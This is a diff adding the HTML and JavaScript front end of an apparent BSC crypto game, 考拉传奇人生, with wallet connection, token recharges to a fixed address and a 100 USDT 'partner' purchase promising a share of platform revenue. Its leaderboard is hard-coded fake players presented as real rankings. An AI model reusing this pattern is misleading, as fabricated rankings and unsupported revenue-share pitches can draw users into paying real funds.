@@ -1,0 +1,1666 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>考拉传奇人生 - 链上传奇DApp</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    
+    body {
+      font-family: 'Microsoft YaHei', 'SimHei', sans-serif;
+      min-height: 100vh;
+      background: 
+        radial-gradient(ellipse at 30% 20%, rgba(138, 43, 226, 0.2) 0%, transparent 50%),
+        radial-gradient(ellipse at 70% 80%, rgba(255, 69, 0, 0.15) 0%, transparent 50%),
+        linear-gradient(180deg, #0a0a0f 0%, #1a0a1f 50%, #0f0a15 100%);
+      color: #e0e0e0;
+      overflow-x: hidden;
+    }
+
+    /* 导航栏 */
+    .navbar {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      height: 60px;
+      background: rgba(0, 0, 0, 0.8);
+      border-bottom: 1px solid rgba(255, 215, 0, 0.3);
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 20px;
+      z-index: 1000;
+      backdrop-filter: blur(10px);
+    }
+
+    .nav-logo {
+      font-size: 20px;
+      font-weight: bold;
+      color: #ffd700;
+      text-shadow: 0 0 10px rgba(255, 215, 0, 0.5);
+    }
+
+    .nav-wallet {
+      display: flex;
+      align-items: center;
+      gap: 15px;
+    }
+
+    .wallet-address {
+      font-size: 12px;
+      color: #ffd700;
+      font-family: monospace;
+      max-width: 150px;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+
+    .sound-btn {
+      width: 36px;
+      height: 36px;
+      border: none;
+      border-radius: 50%;
+      background: rgba(255, 215, 0, 0.2);
+      color: #ffd700;
+      font-size: 16px;
+      cursor: pointer;
+      transition: all 0.3s;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .sound-btn:hover {
+      background: rgba(255, 215, 0, 0.4);
+      transform: scale(1.1);
+    }
+
+    .btn {
+      padding: 10px 20px;
+      border: none;
+      border-radius: 8px;
+      font-size: 14px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: all 0.3s;
+    }
+
+    .btn-connect {
+      background: linear-gradient(135deg, #ffd700, #ff8c00);
+      color: #000;
+      box-shadow: 0 0 15px rgba(255, 215, 0, 0.3);
+    }
+
+    .btn-connect:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 5px 20px rgba(255, 215, 0, 0.5);
+    }
+
+    .btn-primary {
+      background: linear-gradient(135deg, #ff6b00, #ff4500);
+      color: #fff;
+      box-shadow: 0 0 15px rgba(255, 107, 0, 0.3);
+    }
+
+    .btn-primary:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 5px 20px rgba(255, 107, 0, 0.5);
+    }
+
+    .btn-partner {
+      background: linear-gradient(135deg, #22c55e, #16a34a);
+      color: #fff;
+      box-shadow: 0 0 15px rgba(34, 197, 94, 0.3);
+    }
+
+    .btn-partner:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 5px 20px rgba(34, 197, 94, 0.5);
+    }
+
+    .btn-game {
+      background: linear-gradient(135deg, #4a0080, #8000ff);
+      color: #fff;
+      box-shadow: 0 0 15px rgba(128, 0, 255, 0.3);
+    }
+
+    .btn-game:hover {
+      box-shadow: 0 5px 25px rgba(128, 0, 255, 0.5);
+    }
+
+    .btn:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+      transform: none;
+    }
+
+    /* 主内容区 */
+    .main-container {
+      margin-top: 80px;
+      padding: 20px;
+      max-width: 800px;
+      margin-left: auto;
+      margin-right: auto;
+    }
+
+    /* 状态卡片 */
+    .status-card {
+      background: rgba(0, 0, 0, 0.5);
+      border-radius: 15px;
+      padding: 20px;
+      border: 1px solid rgba(255, 215, 0, 0.2);
+      margin-bottom: 20px;
+      backdrop-filter: blur(10px);
+    }
+
+    .status-header {
+      font-size: 18px;
+      font-weight: bold;
+      color: #ffd700;
+      margin-bottom: 15px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .status-header::before {
+      content: '⚡';
+    }
+
+    .balance-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 15px;
+    }
+
+    .balance-item {
+      background: rgba(255, 215, 0, 0.1);
+      padding: 15px;
+      border-radius: 10px;
+      text-align: center;
+      border: 1px solid rgba(255, 215, 0, 0.2);
+    }
+
+    .balance-label {
+      font-size: 12px;
+      color: #9ca3af;
+      margin-bottom: 5px;
+    }
+
+    .balance-value {
+      font-size: 20px;
+      font-weight: bold;
+      color: #ffd700;
+      font-family: monospace;
+    }
+
+    /* 充值区域 */
+    .recharge-section {
+      background: rgba(0, 0, 0, 0.5);
+      border-radius: 15px;
+      padding: 25px;
+      border: 1px solid rgba(255, 69, 0, 0.3);
+      margin-bottom: 20px;
+    }
+
+    .section-title {
+      font-size: 18px;
+      font-weight: bold;
+      color: #ff6b00;
+      margin-bottom: 20px;
+      text-align: center;
+      text-shadow: 0 0 15px rgba(255, 107, 0, 0.5);
+    }
+
+    .input-group {
+      margin-bottom: 15px;
+    }
+
+    .input-label {
+      font-size: 13px;
+      color: #9ca3af;
+      margin-bottom: 8px;
+      display: block;
+    }
+
+    .input-field {
+      width: 100%;
+      padding: 12px 15px;
+      border: 1px solid rgba(255, 215, 0, 0.3);
+      border-radius: 8px;
+      background: rgba(0, 0, 0, 0.5);
+      color: #ffd700;
+      font-size: 14px;
+      font-family: monospace;
+    }
+
+    .input-field:focus {
+      outline: none;
+      border-color: #ffd700;
+      box-shadow: 0 0 10px rgba(255, 215, 0, 0.3);
+    }
+
+    .presets {
+      display: flex;
+      gap: 10px;
+      margin-bottom: 15px;
+      flex-wrap: wrap;
+    }
+
+    .preset-btn {
+      padding: 8px 15px;
+      background: rgba(255, 215, 0, 0.1);
+      border: 1px solid rgba(255, 215, 0, 0.3);
+      border-radius: 5px;
+      color: #ffd700;
+      font-size: 12px;
+      cursor: pointer;
+      transition: all 0.3s;
+    }
+
+    .preset-btn:hover {
+      background: rgba(255, 215, 0, 0.2);
+      border-color: #ffd700;
+    }
+
+    .preset-btn.active {
+      background: #ffd700;
+      color: #000;
+    }
+
+    /* 地推合伙人区域 */
+    .partner-section {
+      background: rgba(0, 0, 0, 0.5);
+      border-radius: 15px;
+      padding: 25px;
+      border: 1px solid rgba(34, 197, 94, 0.3);
+      margin-bottom: 20px;
+    }
+
+    .partner-section .section-title {
+      color: #22c55e;
+      text-shadow: 0 0 15px rgba(34, 197, 94, 0.5);
+    }
+
+    .partner-info {
+      background: rgba(34, 197, 94, 0.1);
+      padding: 15px;
+      border-radius: 10px;
+      margin-bottom: 15px;
+      border: 1px solid rgba(34, 197, 94, 0.2);
+      text-align: center;
+    }
+
+    .partner-price {
+      font-size: 24px;
+      font-weight: bold;
+      color: #22c55e;
+    }
+
+    .partner-desc {
+      font-size: 12px;
+      color: #9ca3af;
+      margin-top: 5px;
+    }
+
+    /* 游戏区域 */
+    .game-section {
+      background: rgba(0, 0, 0, 0.5);
+      border-radius: 15px;
+      padding: 25px;
+      border: 1px solid rgba(128, 0, 255, 0.3);
+      margin-bottom: 20px;
+    }
+
+    .game-title {
+      font-size: 20px;
+      font-weight: bold;
+      color: #ffd700;
+      text-align: center;
+      margin-bottom: 20px;
+      text-shadow: 0 0 20px rgba(255, 215, 0, 0.5);
+    }
+
+    .game-tabs {
+      display: flex;
+      gap: 10px;
+      margin-bottom: 20px;
+      justify-content: center;
+      flex-wrap: wrap;
+    }
+
+    .game-tab {
+      padding: 10px 20px;
+      background: rgba(128, 0, 255, 0.1);
+      border: 1px solid rgba(128, 0, 255, 0.3);
+      border-radius: 8px;
+      color: #e0e0e0;
+      font-size: 14px;
+      cursor: pointer;
+      transition: all 0.3s;
+    }
+
+    .game-tab:hover {
+      background: rgba(128, 0, 255, 0.2);
+    }
+
+    .game-tab.active {
+      background: linear-gradient(135deg, #8000ff, #4a0080);
+      color: #fff;
+      border-color: #8000ff;
+      box-shadow: 0 0 15px rgba(128, 0, 255, 0.5);
+    }
+
+    .game-panel {
+      display: none;
+    }
+
+    .game-panel.active {
+      display: block;
+    }
+
+    /* 战力排行榜 */
+    .leaderboard-container {
+      background: rgba(0, 0, 0, 0.6);
+      border-radius: 12px;
+      padding: 20px;
+      border: 1px solid rgba(255, 215, 0, 0.3);
+    }
+
+    .leaderboard-title {
+      font-size: 20px;
+      font-weight: bold;
+      color: #ffd700;
+      text-align: center;
+      margin-bottom: 15px;
+      text-shadow: 0 0 15px rgba(255, 215, 0, 0.5);
+    }
+
+    .leaderboard-header {
+      display: grid;
+      grid-template-columns: 1fr 2fr 1fr 1fr 1fr;
+      font-size: 12px;
+      color: #888;
+      padding-bottom: 10px;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+      margin-bottom: 10px;
+    }
+
+    .leaderboard-list {
+      list-style: none;
+      padding: 0;
+      max-height: 300px;
+      overflow-y: auto;
+    }
+
+    .leaderboard-item {
+      display: grid;
+      grid-template-columns: 1fr 2fr 1fr 1fr 1fr;
+      align-items: center;
+      padding: 10px;
+      border-radius: 8px;
+      margin-bottom: 5px;
+      transition: background 0.2s;
+    }
+
+    .leaderboard-item:hover {
+      background: rgba(255, 215, 0, 0.1);
+    }
+
+    .leaderboard-item.top-1 {
+      background: linear-gradient(135deg, rgba(255, 215, 0, 0.2), rgba(255, 215, 0, 0.05));
+      border: 1px solid rgba(255, 215, 0, 0.3);
+    }
+
+    .leaderboard-item.top-2 {
+      background: linear-gradient(135deg, rgba(192, 192, 192, 0.2), rgba(192, 192, 192, 0.05));
+      border: 1px solid rgba(192, 192, 192, 0.3);
+    }
+
+    .leaderboard-item.top-3 {
+      background: linear-gradient(135deg, rgba(205, 127, 50, 0.2), rgba(205, 127, 50, 0.05));
+      border: 1px solid rgba(205, 127, 50, 0.3);
+    }
+
+    .rank-number {
+      font-weight: bold;
+      font-size: 14px;
+    }
+
+    .rank-number.top-1 { color: #ffd700; }
+    .rank-number.top-2 { color: #c0c0c0; }
+    .rank-number.top-3 { color: #cd7f32; }
+
+    .my-rank {
+      margin-top: 15px;
+      padding: 10px;
+      background: rgba(128, 0, 255, 0.2);
+      border-radius: 8px;
+      text-align: center;
+      font-size: 14px;
+    }
+
+    /* 技能特效 */
+    @keyframes slash {
+      0% { transform: translateX(0) rotate(0deg); opacity: 1; }
+      50% { transform: translateX(80px) rotate(45deg); opacity: 0.8; }
+      100% { transform: translateX(150px) rotate(90deg); opacity: 0; }
+    }
+
+    .slash-effect {
+      position: absolute;
+      width: 80px;
+      height: 5px;
+      background: linear-gradient(90deg, #ff4500, #ffd700, transparent);
+      border-radius: 3px;
+      box-shadow: 0 0 15px #ff4500, 0 0 30px #ffd700;
+      z-index: 100;
+      animation: slash 0.4s ease-out forwards;
+    }
+
+    @keyframes magicCircle {
+      0% { transform: scale(0) rotate(0deg); opacity: 1; }
+      50% { transform: scale(1.2) rotate(180deg); opacity: 0.8; }
+      100% { transform: scale(1) rotate(360deg); opacity: 0; }
+    }
+
+    .magic-circle {
+      position: absolute;
+      width: 100px;
+      height: 100px;
+      border: 3px solid #9333ea;
+      border-radius: 50%;
+      z-index: 100;
+      animation: magicCircle 0.6s ease-out forwards;
+    }
+
+    .magic-circle::before {
+      content: '';
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      width: 60px;
+      height: 60px;
+      border: 2px solid #a855f7;
+      border-radius: 50%;
+      transform: translate(-50%, -50%);
+    }
+
+    .magic-circle::after {
+      content: '';
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      width: 30px;
+      height: 30px;
+      background: #9333ea;
+      border-radius: 50%;
+      transform: translate(-50%, -50%);
+      box-shadow: 0 0 20px #9333ea;
+    }
+
+    @keyframes arrowFly {
+      0% { transform: translateX(0); opacity: 1; }
+      100% { transform: translateX(300px); opacity: 0; }
+    }
+
+    .arrow-projectile {
+      position: absolute;
+      font-size: 20px;
+      z-index: 100;
+      animation: arrowFly 0.5s linear forwards;
+    }
+
+    @keyframes screenShake {
+      0%, 100% { transform: translateX(0); }
+      25% { transform: translateX(-5px); }
+      75% { transform: translateX(5px); }
+    }
+
+    .shake {
+      animation: screenShake 0.2s ease-in-out;
+    }
+
+    /* 装备合成 */
+    .equipment-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 15px;
+    }
+
+    .equipment-item {
+      background: rgba(0, 0, 0, 0.5);
+      border-radius: 10px;
+      padding: 15px;
+      text-align: center;
+      border: 1px solid rgba(255, 215, 0, 0.15);
+      transition: all 0.3s;
+      cursor: pointer;
+    }
+
+    .equipment-item:hover {
+      transform: translateY(-3px);
+      border-color: rgba(255, 215, 0, 0.4);
+      box-shadow: 0 5px 15px rgba(255, 215, 0, 0.2);
+    }
+
+    .equipment-item.disabled {
+      opacity: 0.5;
+      pointer-events: none;
+    }
+
+    .equipment-icon {
+      font-size: 32px;
+      margin-bottom: 10px;
+    }
+
+    .equipment-name {
+      font-size: 14px;
+      font-weight: bold;
+      color: #ffd700;
+      margin-bottom: 5px;
+    }
+
+    .equipment-cost {
+      font-size: 12px;
+      color: #ff8c00;
+    }
+
+    .equipment-level {
+      font-size: 11px;
+      color: #9ca3af;
+      margin-top: 5px;
+    }
+
+    /* 任务系统 */
+    .quest-list {
+      display: flex;
+      flex-direction: column;
+      gap: 15px;
+    }
+
+    .quest-item {
+      background: rgba(0, 0, 0, 0.5);
+      border-radius: 10px;
+      padding: 15px;
+      border: 1px solid rgba(255, 69, 0, 0.2);
+      display: flex;
+      align-items: center;
+      gap: 15px;
+    }
+
+    .quest-icon {
+      font-size: 28px;
+      width: 50px;
+      text-align: center;
+    }
+
+    .quest-info {
+      flex: 1;
+    }
+
+    .quest-name {
+      font-size: 14px;
+      font-weight: bold;
+      color: #ff6b00;
+      margin-bottom: 5px;
+    }
+
+    .quest-desc {
+      font-size: 12px;
+      color: #9ca3af;
+    }
+
+    .quest-reward {
+      font-size: 12px;
+      color: #ffd700;
+      margin-top: 5px;
+    }
+
+    .quest-action {
+      padding: 8px 15px;
+      background: linear-gradient(135deg, #ff6b00, #ff4500);
+      border: none;
+      border-radius: 5px;
+      color: #fff;
+      font-size: 12px;
+      cursor: pointer;
+    }
+
+    .quest-action:hover {
+      box-shadow: 0 0 10px rgba(255, 107, 0, 0.5);
+    }
+
+    .quest-action.disabled {
+      background: rgba(100, 100, 100, 0.5);
+      color: #9ca3af;
+      cursor: not-allowed;
+    }
+
+    /* 角色信息 */
+    .character-section {
+      background: rgba(0, 0, 0, 0.5);
+      border-radius: 15px;
+      padding: 20px;
+      border: 1px solid rgba(255, 215, 0, 0.2);
+      margin-bottom: 20px;
+    }
+
+    .character-header {
+      display: flex;
+      align-items: center;
+      gap: 15px;
+      margin-bottom: 15px;
+    }
+
+    .character-avatar {
+      width: 60px;
+      height: 60px;
+      border-radius: 50%;
+      background: linear-gradient(135deg, #ffd700, #ff6b00);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 24px;
+      box-shadow: 0 0 20px rgba(255, 215, 0, 0.3);
+    }
+
+    .character-name {
+      font-size: 16px;
+      font-weight: bold;
+      color: #ffd700;
+    }
+
+    .character-level {
+      font-size: 12px;
+      color: #ff8c00;
+    }
+
+    .character-stats {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 10px;
+    }
+
+    .stat-item {
+      background: rgba(255, 215, 0, 0.05);
+      padding: 10px;
+      border-radius: 8px;
+      text-align: center;
+    }
+
+    .stat-label {
+      font-size: 11px;
+      color: #9ca3af;
+    }
+
+    .stat-value {
+      font-size: 16px;
+      font-weight: bold;
+      color: #ffd700;
+    }
+
+    /* 装备栏 */
+    .inventory-section {
+      background: rgba(0, 0, 0, 0.5);
+      border-radius: 15px;
+      padding: 20px;
+      border: 1px solid rgba(128, 0, 255, 0.2);
+    }
+
+    .inventory-grid {
+      display: grid;
+      grid-template-columns: repeat(6, 1fr);
+      gap: 10px;
+    }
+
+    .inventory-slot {
+      width: 50px;
+      height: 50px;
+      background: rgba(0, 0, 0, 0.5);
+      border: 1px solid rgba(255, 215, 0, 0.2);
+      border-radius: 5px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 20px;
+      transition: all 0.3s;
+    }
+
+    .inventory-slot:hover {
+      border-color: #ffd700;
+      box-shadow: 0 0 10px rgba(255, 215, 0, 0.3);
+    }
+
+    .inventory-slot.empty {
+      border-color: rgba(100, 100, 100, 0.3);
+    }
+
+    /* 消息提示 */
+    .toast {
+      position: fixed;
+      bottom: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: rgba(0, 0, 0, 0.9);
+      padding: 15px 30px;
+      border-radius: 10px;
+      border: 1px solid #ffd700;
+      color: #ffd700;
+      font-size: 14px;
+      z-index: 2000;
+      opacity: 0;
+      transition: opacity 0.3s;
+      box-shadow: 0 0 20px rgba(255, 215, 0, 0.3);
+    }
+
+    .toast.show {
+      opacity: 1;
+    }
+
+    .toast.success {
+      border-color: #22c55e;
+      color: #22c55e;
+      box-shadow: 0 0 20px rgba(34, 197, 94, 0.3);
+    }
+
+    .toast.error {
+      border-color: #ef4444;
+      color: #ef4444;
+      box-shadow: 0 0 20px rgba(239, 68, 68, 0.3);
+    }
+
+    /* 加载动画 */
+    .loading {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: rgba(0, 0, 0, 0.8);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 3000;
+    }
+
+    .loading-spinner {
+      width: 50px;
+      height: 50px;
+      border: 3px solid rgba(255, 215, 0, 0.3);
+      border-top-color: #ffd700;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    /* 响应式 */
+    @media (max-width: 600px) {
+      .equipment-grid {
+        grid-template-columns: repeat(2, 1fr);
+      }
+      .balance-grid {
+        grid-template-columns: 1fr;
+      }
+      .character-stats {
+        grid-template-columns: repeat(2, 1fr);
+      }
+      .inventory-grid {
+        grid-template-columns: repeat(4, 1fr);
+      }
+      .game-tabs {
+        flex-wrap: wrap;
+      }
+    }
+  </style>
+</head>
+<body>
+  <!-- 导航栏 -->
+  <nav class="navbar">
+    <div class="nav-logo">⚔️ 考拉传奇人生</div>
+    <div class="nav-wallet">
+      <button class="sound-btn" id="soundBtn" onclick="SoundManager.toggleMute()" title="关闭音效">🎵</button>
+      <span class="wallet-address" id="walletAddress">未连接</span>
+      <button class="btn btn-connect" id="connectBtn" onclick="connectWallet()">连接钱包</button>
+    </div>
+  </nav>
+
+  <!-- 主内容 -->
+  <div class="main-container">
+    <!-- 状态卡片 -->
+    <div class="status-card">
+      <div class="status-header">我的资产</div>
+      <div class="balance-grid">
+        <div class="balance-item">
+          <div class="balance-label">考拉传奇币</div>
+          <div class="balance-value" id="koalaBalance">0</div>
+        </div>
+        <div class="balance-item">
+          <div class="balance-label">USDT余额</div>
+          <div class="balance-value" id="usdtBalance">0</div>
+        </div>
+        <div class="balance-item">
+          <div class="balance-label">BNB余额</div>
+          <div class="balance-value" id="bnbBalance">0</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- 角色信息 -->
+    <div class="character-section" id="characterSection" style="display:none;">
+      <div class="character-header">
+        <div class="character-avatar">🧙</div>
+        <div>
+          <div class="character-name" id="charName">传奇勇士</div>
+          <div class="character-level">Lv.<span id="charLevel">1</span></div>
+        </div>
+      </div>
+      <div class="character-stats">
+        <div class="stat-item">
+          <div class="stat-label">攻击力</div>
+          <div class="stat-value" id="statAtk">10</div>
+        </div>
+        <div class="stat-item">
+          <div class="stat-label">防御力</div>
+          <div class="stat-value" id="statDef">5</div>
+        </div>
+        <div class="stat-item">
+          <div class="stat-label">生命值</div>
+          <div class="stat-value" id="statHp">100</div>
+        </div>
+        <div class="stat-item">
+          <div class="stat-label">经验值</div>
+          <div class="stat-value" id="statExp">0</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- 充值区域 -->
+    <div class="recharge-section">
+      <div class="section-title">💎 充值传奇人生</div>
+      <div class="input-group">
+        <label class="input-label">充值传奇人生币数量</label>
+        <div class="presets">
+          <button class="preset-btn" onclick="setRechargeAmount(10)">10 传奇币</button>
+          <button class="preset-btn" onclick="setRechargeAmount(50)">50 传奇币</button>
+          <button class="preset-btn" onclick="setRechargeAmount(100)">100 传奇币</button>
+          <button class="preset-btn" onclick="setRechargeAmount(300)">300 传奇币</button>
+        </div>
+        <input type="number" class="input-field" id="rechargeAmount" placeholder="输入传奇人生币数量" step="1">
+      </div>
+      <div class="input-group">
+        <label class="input-label">收款地址</label>
+        <input type="text" class="input-field" id="receiveAddress" 
+               value="0xD5D4587f4bFea0212C6bf63C3358dB417e4d5e04" readonly>
+      </div>
+      <button class="btn btn-primary" id="rechargeBtn" onclick="rechargeKoala()" disabled>
+        充值传奇人生
+      </button>
+    </div>
+
+    <!-- 地推合伙人区域 -->
+    <div class="partner-section">
+      <div class="section-title">🤝 地推合伙人招募</div>
+      <div class="partner-info">
+        <div class="partner-price">100 USDT / 份</div>
+        <div class="partner-desc">成为地推合伙人，共享平台收益</div>
+      </div>
+      <div class="input-group">
+        <label class="input-label">购买份数</label>
+        <div class="presets">
+          <button class="preset-btn active" onclick="setPartnerCount(1)">1份</button>
+        </div>
+        <input type="number" class="input-field" id="partnerCount" value="1" min="1" max="1" readonly>
+      </div>
+      <div class="input-group">
+        <label class="input-label">应付金额: <span id="partnerTotal">100</span> USDT</label>
+      </div>
+      <button class="btn btn-partner" id="partnerBtn" onclick="becomePartner()" disabled>
+        成为合伙人
+      </button>
+    </div>
+
+    <!-- 游戏区域 -->
+    <div class="game-section">
+      <div class="game-title">🎮 传奇人生 · 链上游戏</div>
+      
+      <div class="game-tabs">
+        <div class="game-tab active" onclick="switchTab('synthesize')">装备合成</div>
+        <div class="game-tab" onclick="switchTab('quests')">任务系统</div>
+        <div class="game-tab" onclick="switchTab('boss')">BOSS挑战</div>
+        <div class="game-tab" onclick="switchTab('leaderboard')">战力排行</div>
+      </div>
+
+      <!-- 装备合成 -->
+      <div class="game-panel active" id="synthesizePanel">
+        <div class="equipment-grid" id="equipmentGrid">
+          <!-- 动态生成 -->
+        </div>
+      </div>
+
+      <!-- 任务系统 -->
+      <div class="game-panel" id="questsPanel">
+        <div class="quest-list" id="questList">
+          <!-- 动态生成 -->
+        </div>
+      </div>
+
+      <!-- BOSS挑战 -->
+      <div class="game-panel" id="bossPanel">
+        <div class="quest-list" id="bossList">
+          <!-- 动态生成 -->
+        </div>
+      </div>
+
+      <!-- 战力排行榜 -->
+      <div class="game-panel" id="leaderboardPanel">
+        <div class="leaderboard-container">
+          <div class="leaderboard-title">🏆 战力排行榜</div>
+          <div class="leaderboard-header">
+            <span>排名</span>
+            <span>玩家</span>
+            <span>职业</span>
+            <span>等级</span>
+            <span>战力</span>
+          </div>
+          <ul class="leaderboard-list" id="leaderboardList">
+            <!-- 动态生成 -->
+          </ul>
+          <div class="my-rank" id="myRankDisplay"></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- 装备栏 -->
+    <div class="inventory-section" id="inventorySection" style="display:none;">
+      <div class="status-header">我的装备栏</div>
+      <div class="inventory-grid" id="inventoryGrid">
+        <!-- 动态生成 -->
+      </div>
+    </div>
+  </div>
+
+  <!-- 消息提示 -->
+  <div class="toast" id="toast"></div>
+
+  <!-- 加载动画 -->
+  <div class="loading" id="loading" style="display:none;">
+    <div class="loading-spinner"></div>
+  </div>
+
+  <!-- Ethers.js -->
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+  
+  <script>
+    // 配置
+    const KOALA_ADDRESS = '0xf39ff03f155f4a48eddf14abc5ded10f075b5555';
+    const USDT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955';
+    const RECEIVE_ADDRESS = '0xD5D4587f4bFea0212C6bf63C3358dB417e4d5e04';
+    
+    const KOALA_ABI = [
+      "function balanceOf(address owner) view returns (uint256)",
+      "function approve(address spender, uint256 amount) returns (bool)",
+      "function allowance(address owner, address spender) view returns (uint256)",
+      "function transfer(address to, uint256 amount) returns (bool)",
+      "function decimals() view returns (uint8)",
+      "function symbol() view returns (string)"
+    ];
+
+    const USDT_ABI = [
+      "function balanceOf(address owner) view returns (uint256)",
+      "function approve(address spender, uint256 amount) returns (bool)",
+      "function allowance(address owner, address spender) view returns (uint256)",
+      "function transfer(address to, uint256 amount) returns (bool)",
+      "function decimals() view returns (uint8)"
+    ];
+
+    // 游戏数据（消耗10-300枚考拉传奇币）
+    const equipmentData = [
+      { id: 'sword1', name: '铁剑', icon: '⚔️', cost: 10, atk: 5, level: 1 },
+      { id: 'sword2', name: '铜剑', icon: '🗡️', cost: 30, atk: 10, level: 3 },
+      { id: 'sword3', name: '银剑', icon: '🔪', cost: 80, atk: 20, level: 6 },
+      { id: 'armor1', name: '布甲', icon: '🛡️', cost: 15, def: 5, level: 1 },
+      { id: 'armor2', name: '铁甲', icon: '🥋', cost: 50, def: 15, level: 4 },
+      { id: 'armor3', name: '金甲', icon: '🦺', cost: 120, def: 30, level: 8 },
+      { id: 'helm1', name: '头盔', icon: '⛑️', cost: 20, def: 3, level: 2 },
+      { id: 'ring1', name: '力量戒指', icon: '💍', cost: 40, atk: 8, level: 3 },
+      { id: 'neck1', name: '护身符', icon: '📿', cost: 60, hp: 50, level: 4 }
+    ];
+
+    const questData = [
+      { id: 'q1', name: '新手试炼', icon: '📜', desc: '完成基础训练', cost: 10, reward: '经验+100' },
+      { id: 'q2', name: '采集任务', icon: '🌿', desc: '收集草药材料', cost: 20, reward: '金币+200' },
+      { id: 'q3', name: '猎杀野狼', icon: '🐺', desc: '消灭10只野狼', cost: 50, reward: '铁剑' },
+      { id: 'q4', name: '矿洞探险', icon: '⛏️', desc: '探索神秘矿洞', cost: 80, reward: '稀有矿石' },
+      { id: 'q5', name: '守卫村庄', icon: '🏰', desc: '保护村民安全', cost: 100, reward: '声望+50' }
+    ];
+
+    const bossData = [
+      { id: 'demon', name: '赤月恶魔', icon: '🐉', desc: '传说中的赤月恶魔', cost: 150, reward: '赤月套装' },
+      { id: 'dragon', name: '火焰龙王', icon: '🔥', desc: '火山深处的龙王', cost: 200, reward: '龙王宝剑' },
+      { id: 'lord', name: '黑暗领主', icon: '💀', desc: '黑暗城堡的主人', cost: 300, reward: '传说神装' }
+    ];
+
+    const classData = {
+      warrior: { name: '战士', icon: '⚔️', baseAtk: 15, baseDef: 8, baseHp: 120 },
+      mage: { name: '法师', icon: '🧙', baseAtk: 20, baseDef: 5, baseHp: 80 },
+      archer: { name: '弓箭手', icon: '🏹', baseAtk: 18, baseDef: 6, baseHp: 95 }
+    };
+
+    const leaderboardData = [
+      { name: '战神归来', class: 'warrior', level: 50, atk: 500, def: 300, hp: 5000 },
+      { name: '魔法至尊', class: 'mage', level: 48, atk: 600, def: 200, hp: 3500 },
+      { name: '神箭手', class: 'archer', level: 45, atk: 550, def: 250, hp: 4000 },
+      { name: '屠龙勇士', class: 'warrior', level: 42, atk: 450, def: 280, hp: 4500 },
+      { name: '元素使者', class: 'mage', level: 40, atk: 480, def: 180, hp: 3200 },
+      { name: '丛林猎手', class: 'archer', level: 38, atk: 420, def: 220, hp: 3800 },
+      { name: '圣骑士', class: 'warrior', level: 35, atk: 380, def: 320, hp: 5200 },
+      { name: '暗影法师', class: 'mage', level: 33, atk: 400, def: 150, hp: 2800 },
+      { name: '鹰眼', class: 'archer', level: 30, atk: 350, def: 190, hp: 3400 },
+      { name: '狂战士', class: 'warrior', level: 28, atk: 320, def: 200, hp: 4000 }
+    ];
+
+    // 状态
+    let provider, signer, userAddress;
+    let koalaContract, usdtContract;
+    let currentKoalaBalance = 0;
+    let character = {
+      name: '传奇勇士',
+      class: 'warrior',
+      level: 1,
+      atk: 10,
+      def: 5,
+      hp: 100,
+      exp: 0
+    };
+    let inventory = [];
+
+    // 连接钱包
+    async function connectWallet() {
+      if (typeof window.ethereum === 'undefined') {
+        showToast('请安装MetaMask钱包', 'error');
+        return;
+      }
+
+      showLoading(true);
+      try {
+        provider = new ethers.providers.Web3Provider(window.ethereum);
+        await provider.send('eth_requestAccounts', []);
+        signer = provider.getSigner();
+        userAddress = await signer.getAddress();
+
+        const network = await provider.getNetwork();
+        if (network.chainId !== 56) {
+          showToast('请切换到BSC主网', 'error');
+          showLoading(false);
+          return;
+        }
+
+        koalaContract = new ethers.Contract(KOALA_ADDRESS, KOALA_ABI, signer);
+        usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);
+
+        document.getElementById('walletAddress').textContent = 
+          userAddress.slice(0, 6) + '...' + userAddress.slice(-4);
+        document.getElementById('connectBtn').textContent = '已连接';
+        document.getElementById('connectBtn').disabled = true;
+        document.getElementById('rechargeBtn').disabled = false;
+        document.getElementById('partnerBtn').disabled = false;
+        document.getElementById('characterSection').style.display = 'block';
+        document.getElementById('inventorySection').style.display = 'block';
+
+        await updateBalances();
+        initGame();
+
+        showToast('钱包连接成功', 'success');
+      } catch (e) {
+        showToast('连接失败: ' + e.message, 'error');
+      }
+      showLoading(false);
+    }
+
+    // 更新余额
+    async function updateBalances() {
+      try {
+        const bnbBal = await signer.getBalance();
+        document.getElementById('bnbBalance').textContent = 
+          parseFloat(ethers.utils.formatEther(bnbBal)).toFixed(4);
+
+        const usdtBal = await usdtContract.balanceOf(userAddress);
+        const usdtDecimals = await usdtContract.decimals();
+        document.getElementById('usdtBalance').textContent = 
+          parseFloat(ethers.utils.formatUnits(usdtBal, usdtDecimals)).toFixed(2);
+
+        const koalaBal = await koalaContract.balanceOf(userAddress);
